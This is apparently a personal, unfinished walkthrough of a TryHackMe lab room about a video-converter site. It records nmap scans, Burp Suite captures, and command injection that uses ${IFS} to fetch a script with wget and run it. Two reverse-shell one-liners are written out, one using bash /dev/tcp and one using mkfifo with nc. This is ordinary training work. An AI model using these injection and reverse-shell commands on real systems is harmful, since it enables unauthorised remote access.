</br> convert my video - https://tryhackme.com/r/room/convertmyvideo
  </br>
</br><b>nmap -p- -T5 10.10.243.35 -v</b>
</br>Not shown: 65533 closed ports
</br>PORT   STATE SERVICE
</br>22/tcp open  ssh
</br>80/tcp open  http
</br>MAC Address: 02:22:34:47:2F:05 (Unknown)
</br>
</br>-> nmap 22,80 -A 10.10.243.35 -v
</br>PORT   STATE SERVICE VERSION
</br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</br>| ssh-hostkey: 
</br>|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
</br>|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
</br>|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
</br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
</br>| http-methods: 
</br>|_  Supported Methods: GET HEAD POST OPTIONS
</br>|_http-server-header: Apache/2.4.29 (Ubuntu)
</br>|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
</br>MAC Address: 02:22:34:47:2F:05 (Unknown)
</br>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
</br>
</br>Possible lead from apache version...
![leadFound1](https://github.com/user-attachments/assets/4a800d2f-c22b-4d64-a989-d7d744f070e8)

</br> well, before messing with that, spin up burpsuite.See what we can see
</br>Make sure my browser is on so it can intercept. 
![burpon](https://github.com/user-attachments/assets/76d1c130-9f47-4e19-9661-3090f010ad53)

</br>put in dummy info to the web browser and hit the button so I capture the traffic, trying to see what’s happening on the website.
</br> the dummy string is just sily keystrokes wefewfwefwef
![imortant23r32r23](https://github.com/user-attachments/assets/4a984777-fc2b-404f-b9c6-6fdd6723be32)

</br>trying to do command injection EOF is weird.
</br>use internal field separatoe ${IFS} in place of the space to be an explicit deliniation between the command and its flags
![postExpectsURLIDForYT](https://github.com/user-attachments/assets/7533ff5d-4fdc-45a6-9949-fcda47fa3314)
</br>
![rtClickSendToRepeater](https://github.com/user-attachments/assets/f2fabc55-f1b4-4e7a-8dff-6b3476679038)
</br>
</br>nano myHook.sh
</br>paste in a bash reverse shell one-liner ->
</br> <b> bash -i >& /dev/tcp/10.0.0.1/8888 0>&1 </b>
</br>
</br>(have to use a weird post since 80 and 8080 are already occupied in error messages that occur, so use anything unoccupied)
</br> <b>python -m SimpleHTTPServer 7000</b>
</br> The whole server and transfer shuffle is shown below
</br>wget${IFS}10.10.12.52:7000/hookMe.sh
![fileTransferTrhoughBurpInjection](https://github.com/user-attachments/assets/5a16e55c-2331-4ab7-8468-a09bce9ea08d)

</br>chmod${IFS}777${IFS}hookMe.sh
</br>plus sign causes problems so grant all perms with chmod 777
</br> also can't use ./ for ./hookMe.sh, so need to explicitly call bash to run the script below
</br> bash${IFS}hookMe.sh
![fileTransferTrhoughBurpInjection](https://github.com/user-attachments/assets/2353bbb5-fdd4-4dda-8cad-253e590c3f0d)

</br>errors encountered where 8888 was in use? 
</br>needed to change and re-upload file to get a port that would work.
</br> new port 7654 also not working
</br> seeking guidance from THM resources
</br>! TCH security walkthrough’s guidance needs to address this issue and explain how port conflicts can screw things up, because they didn’t teach a thing to identify this problem much less ameliorate it. 
</br> literally can't be followe
</br> using another payload for the one-liner
</br> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
</br> also not working.
</br> pursuit terminated, clarity not gained, 2 hour mark exceeded off doing the same thing a dozen different ways and gerring no results

</br> at least I know how to use the history function in burpsuite better
</br> box deemed low-priority for skill-gain, moving to next engagement
